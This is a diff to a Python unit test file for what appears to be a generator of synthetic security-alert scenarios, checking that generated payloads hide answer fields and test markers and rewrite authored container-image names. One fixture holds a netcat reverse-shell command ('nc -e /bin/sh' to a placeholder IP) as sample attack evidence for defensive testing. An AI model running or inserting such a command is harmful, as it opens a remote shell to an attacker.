@@ -64,7 +64,9 @@ class AlertScenariosTest(unittest.TestCase):
             self.assertEqual(payload["tenant_id"], TENANT)
             self.assertTrue(payload["source_event_ids"])
             self.assertEqual(payload["event_time"], "2026-10-22T00:00:00+00:00")
-            self.assertIn("synthetic", payload["tags"])
+            self.assertNotIn("synthetic", payload["tags"])
+            self.assertNotIn("contract-test", json.dumps(payload))
+            self.assertNotIn("authored_description", payload)
             for forbidden in scenarios.ANSWER_FIELDS:
                 self.assertNotIn(forbidden, json.dumps(payload))
                 self.assertIn(forbidden, expected)
@@ -80,6 +82,32 @@ class AlertScenariosTest(unittest.TestCase):
         self.assertIn("src_ip", second)
         self.assertEqual(scenarios._entities([{"Computer": "A", "User": "alice"}, {"Computer": "B", "User": "alice"}]),
                          {"username": "alice"})
+
+    def test_authored_container_identity_keeps_evidence_and_control_separate(self):
+        original = [{"requestObject": {"spec": {"containers": [
+            {"image": "registry.local/repo:malicious-backdoor", "securityContext": {"privileged": True}},
+            {"image": "alpine"}]}}, "exitCode": 0, "allowed": False, "observations": []},
+            {"image": "registry.local/repo:malicious-backdoor", "Image": "C:\\Windows\\cmd.exe",
+             "command": "nc -e /bin/sh 192.0.2.10 4444", "label": "embedded netcat reverse-shell binary"}]
+        projected, changes = scenarios._authored_identifiers(original)
+        first = projected[0]["requestObject"]["spec"]["containers"]
+        self.assertEqual(first[0]["image"], projected[1]["image"])
+        self.assertNotEqual(first[1]["image"], "alpine")
+        self.assertNotEqual(first[0]["image"], first[1]["image"])
+        self.assertTrue(first[0]["securityContext"]["privileged"])
+        self.assertEqual(projected[0]["exitCode"], 0)
+        self.assertIs(projected[0]["allowed"], False)
+        self.assertEqual(projected[0]["observations"], [])
+        for field in ("Image", "command", "label"):
+            self.assertEqual(projected[1][field], original[1][field])
+        self.assertEqual(len(changes), 3)
+        self.assertEqual(original[1]["image"], "registry.local/repo:malicious-backdoor")
+        manifest = self.generate(count=1, template_ids=["malicious-container-image"])
+        payload = json.loads((self.root / "batch" / manifest["records"][0]["payload"]).read_text())
+        expected = json.loads((self.root / "batch" / manifest["records"][0]["expected"]).read_text())
+        self.assertNotIn("malicious-backdoor", json.dumps(payload))
+        self.assertNotIn("authored_identifier_changes", json.dumps(payload))
+        self.assertEqual(len(expected["authored_identifier_changes"]), 2)
 
     def test_generation_rejects_overwrite_and_invalid_boundaries(self):
         self.generate()
